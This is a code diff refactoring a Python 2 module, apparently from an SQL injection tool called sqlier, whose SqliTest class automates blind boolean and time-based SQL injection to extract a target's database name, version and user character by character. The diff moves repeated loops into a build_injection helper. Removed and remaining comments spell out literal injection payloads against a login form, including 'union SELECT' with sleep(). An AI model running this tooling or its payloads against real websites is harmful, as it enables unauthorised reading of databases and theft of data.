@@ -1,10 +1,12 @@
 #!/usr/bin/env python
 # -*- coding:utf-8 -*-
-from lib.log import logger
-from config import BaseConfig
-from config import UnpackFunction
-from data import DataProcess
 from tqdm import trange
+
+from sqlier.config import BaseConfig
+from sqlier.config import UnpackFunction
+from lib.data import DataProcess
+from lib.log import logger
+from lib.dealpayload import build_injection
 
 __author__ = "LoRexxar"
 
@@ -67,16 +69,10 @@ class SqliTest(BaseConfig):
                 # 先注database长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database length sqli...")
-                # logger.debug("Start database length sqli payload Queue build...")
-                for i in trange(50, desc="Database length sqli...", leave=False):
-                    # payload = "user=user1' %26%26 ((select length(database())) > " + repr(i) + ")  %26%26 '1'='1&passwd=ddog123&submit=Log+In"
-                    payload = self.dealpayload.construct_build_payload(select="length(database())", compare=i)
-                    if self.Data.GetBuildData(payload, self.len) == 0:
-                        database_len = i
-                        break
-                    elif i == 50:
-                        logger.error("Database length > 50...")
-                        database_len = 50
+                retVal = build_injection(select="length(database())",
+                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                         isCount=True, sqlirequest=self.sqlirequest)
+                database_len = int(retVal)
 
                 logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                 print "[*] database_len: %d" % database_len
@@ -84,15 +80,11 @@ class SqliTest(BaseConfig):
 
                 # 再注database
                 logger.debug("Start database sqli...")
-                for i in range(1, database_len):
-                    for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
-                        # payload = "user=user1'%26%26ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
-                        payload = self.dealpayload.construct_build_payload(
-                            select="ascii(mid(database()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.GetBuildData(payload, self.len) == 0:
-                            database += chr(int(j+30))
-                            break
+                for i in trange(1, database_len+1, leave=False):
+                    retVal = build_injection(select="ascii(mid(database()," + repr(i) + ",1))",
+                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                             isStrings=True, sqlirequest=self.sqlirequest)
+                    database += chr(retVal)
                 logger.debug("Database sqli success...The database is %s" % database)
                 print "[*] database: %s" % database
 
@@ -121,8 +113,9 @@ class SqliTest(BaseConfig):
                     for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
                         # payload = "user=ddog123'union SELECT 1,if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
                         #     j + 30) + ",sleep(" + repr(self.time) + "),0) %23"
-                        payload = self.dealpayload.construct_time_payload(select="ascii(mid(database()," + repr(i) + ",1))",
-                                                                          compare=(j + 30))
+                        payload = self.dealpayload.construct_time_payload(
+                            select="ascii(mid(database()," + repr(i) + ",1))",
+                            compare=(j + 30))
                         if self.Data.GetTimeData(payload, self.time) == 0:
                             database += chr(int(j + 30))
                             break
@@ -157,15 +150,10 @@ class SqliTest(BaseConfig):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start database length sqli...")
                 # logger.debug("Start database length sqli payload Queue build...")
-                for i in trange(50, desc="Database length sqli...", leave=False):
-                    # payload = {"user": "user1' && (select length(database())) > " + repr(i) + " && '1'='1", "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_build_payload(select="length(database())", compare=i)
-                    if self.Data.PostBuildData(payload, self.len) == 0:
-                        database_len = i
-                        break
-                    elif i == 50:
-                        logger.error("Database length > 50...")
-                        database_len = 50
+                retVal = build_injection(select="length(database())",
+                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                         isCount=True, sqlirequest=self.sqlirequest)
+                database_len = int(retVal)
 
                 logger.debug("Database length sqli success...The database_len is %d..." % database_len)
                 print "[*] database_len: %d" % database_len
@@ -173,15 +161,11 @@ class SqliTest(BaseConfig):
 
                 # 再注database
                 logger.debug("Start database sqli...")
-                for i in range(1, database_len + 1):
-                    for j in trange(100, desc='Database\'s %dth char sqli' % i, leave=False):
-                        # payload = {"user": "user1' && ascii(mid(database()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1", "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_build_payload(
-                            select="ascii(mid(database()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.PostBuildData(payload, self.len) == 0:
-                            database += chr(int(j + 30))
-                            break
+                for i in trange(1, database_len+1, leave=False):
+                    retVal = build_injection(select="ascii(mid(database()," + repr(i) + ",1))",
+                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                             isStrings=True, sqlirequest=self.sqlirequest)
+                    database += chr(retVal)
                 logger.debug("Database sqli success...The database is %s" % database)
                 print "[*] database: %s" % database
 
@@ -248,13 +232,10 @@ class SqliTest(BaseConfig):
                 # 先注version长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start version length sqli...")
-                for i in trange(30, desc="Version length sqli...", leave=False):
-                    # payload = "user=user1' %26%26 (select length(version())) > " + repr(
-                    #     i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
-                    payload = self.dealpayload.construct_build_payload(select="length(version())", compare=i)
-                    if self.Data.GetBuildData(payload, self.len) == 0:
-                        version_len = i
-                        break
+                retVal = build_injection(select="length(version())",
+                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                         isCount=True, sqlirequest=self.sqlirequest)
+                version_len = int(retVal)
 
                 logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                 print "[*] version_len: %d" % version_len
@@ -262,16 +243,11 @@ class SqliTest(BaseConfig):
 
                 # 再注version
                 logger.debug("Start version sqli...")
-                for i in range(1, version_len + 1):
-                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
-                        # payload = "user=user1'%26%26ascii(mid(version()," + repr(i) + ",1))>" + repr(
-                        #     j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
-                        payload = self.dealpayload.construct_build_payload(
-                            select="ascii(mid(version()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.GetBuildData(payload, self.len) == 0:
-                            version += chr(int(j + 30))
-                            break
+                for i in trange(1, version_len+1, leave=False):
+                    retVal = build_injection(select="ascii(mid(version()," + repr(i) + ",1))",
+                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                             isStrings=True, sqlirequest=self.sqlirequest)
+                    version += chr(retVal)
                 logger.debug("version sqli success...The version is %s" % version)
                 print "[*] version: %s" % version
 
@@ -334,15 +310,10 @@ class SqliTest(BaseConfig):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start version length sqli...")
                 # logger.debug("Start version length sqli payload Queue build...")
-                for i in trange(30, desc="Version length sqli...", leave=False):
-                    # payload = {"user": "user1' && (select length(version())) > " + repr(i) + " && '1'='1",
-                    #            "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_build_payload(
-                        select="length(version())",
-                        compare=i)
-                    if self.Data.PostBuildData(payload, self.len) == 0:
-                        version_len = i
-                        break
+                retVal = build_injection(select="length(version())",
+                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                         isCount=True, sqlirequest=self.sqlirequest)
+                version_len = int(retVal)
 
                 logger.debug("Version length sqli success...The database_len is %d..." % version_len)
                 print "[*] version_len: %d" % version_len
@@ -350,17 +321,11 @@ class SqliTest(BaseConfig):
 
                 # 再注version
                 logger.debug("Start version sqli...")
-                for i in range(1, version_len + 1):
-                    for j in trange(100, desc='Version\'s %dth char sqli' % i, leave=False):
-                        # payload = {
-                        #     "user": "user1' && ascii(mid(version()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1",
-                        #     "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_build_payload(
-                            select="ascii(mid(version()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.PostBuildData(payload, self.len) == 0:
-                            version += chr(int(j + 30))
-                            break
+                for i in trange(1, version_len+1, leave=False):
+                    retVal = build_injection(select="ascii(mid(version()," + repr(i) + ",1))",
+                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                             isStrings=True, sqlirequest=self.sqlirequest)
+                    version += chr(retVal)
                 logger.debug("Version sqli success...The version is %s" % version)
                 print "[*] version: %s" % version
 
@@ -428,16 +393,10 @@ class SqliTest(BaseConfig):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
                 # logger.debug("Start user length sqli payload Queue build...")
-                for i in trange(50, desc="User length sqli...", leave=False):
-                    # payload = "user=user1' %26%26 (select length(user())) > " + repr(
-                    #     i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
-                    payload = self.dealpayload.construct_build_payload(select="length(user())", compare=i)
-                    if self.Data.GetBuildData(payload, self.len) == 0:
-                        user_len = i
-                        break
-                    elif i == 50:
-                        logger.error("user length > 50")
-                        user_len = 50
+                retVal = build_injection(select="length(user())",
+                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                         isCount=True, sqlirequest=self.sqlirequest)
+                user_len = int(retVal)
 
                 logger.debug("User length sqli success...The user_len is %d..." % user_len)
                 print "[*] user_len: %d" % user_len
@@ -445,16 +404,11 @@ class SqliTest(BaseConfig):
 
                 # 再注user
                 logger.debug("Start user sqli...")
-                for i in range(1, user_len + 1):
-                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
-                        # payload = "user=user1'%26%26ascii(mid(user()," + repr(i) + ",1))>" + repr(
-                        #     j + 30) + "%26%26'1'='1&passwd=ddog123&submit=Log+In"
-                        payload = self.dealpayload.construct_build_payload(
-                            select="ascii(mid(user()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.GetBuildData(payload, self.len) == 0:
-                            user += chr(int(j + 30))
-                            break
+                for i in trange(1, user_len+1, leave=False):
+                    retVal = build_injection(select="ascii(mid(user()," + repr(i) + ",1))",
+                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                             isStrings=True, sqlirequest=self.sqlirequest)
+                    user += chr(retVal)
                 logger.debug("User sqli success...The user is %s" % user)
                 print "[*] user: %s" % user
 
@@ -521,18 +475,10 @@ class SqliTest(BaseConfig):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
                 # logger.debug("Start user length sqli payload Queue build...")
-                for i in trange(50, desc="User length sqli...", leave=False):
-                    # payload = {"user": "user1' && (select length(user())) > " + repr(i) + " && '1'='1",
-                    #            "passwd": "ddog123"}
-                    payload = self.dealpayload.construct_build_payload(
-                        select="length(user())",
-                        compare=i)
-                    if self.Data.PostBuildData(payload, self.len) == 0:
-                        user_len = i
-                        break
-                    elif i == 50:
-                        logger.error("user length > 50")
-                        user_len = 50
+                retVal = build_injection(select="length(user())",
+                                         dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                         isCount=True, sqlirequest=self.sqlirequest)
+                user_len = int(retVal)
 
                 logger.debug("User length sqli success...The user_len is %d..." % user_len)
                 print "[*] user_len: %d" % user_len
@@ -540,17 +486,11 @@ class SqliTest(BaseConfig):
 
                 # 再注user
                 logger.debug("Start user sqli...")
-                for i in range(1, user_len + 1):
-                    for j in trange(100, desc='User\'s %dth char sqli' % i, leave=False):
-                        # payload = {
-                        #     "user": "user1' && ascii(mid(user()," + repr(i) + ",1))>" + repr(j + 30) + "&&'1'='1",
-                        #     "passwd": "ddog123"}
-                        payload = self.dealpayload.construct_build_payload(
-                            select="ascii(mid(database()," + repr(i) + ",1))",
-                            compare=(j + 30))
-                        if self.Data.PostBuildData(payload, self.len) == 0:
-                            user += chr(int(j + 30))
-                            break
+                for i in trange(1, user_len+1, leave=False):
+                    retVal = build_injection(select="ascii(mid(user()," + repr(i) + ",1))",
+                                             dealpayload=self.dealpayload, data=self.Data, lens=self.len,
+                                             isStrings=True, sqlirequest=self.sqlirequest)
+                    user += chr(retVal)
                 logger.debug("User sqli success...The user is %s" % user)
                 print "[*] user: %s" % user
 
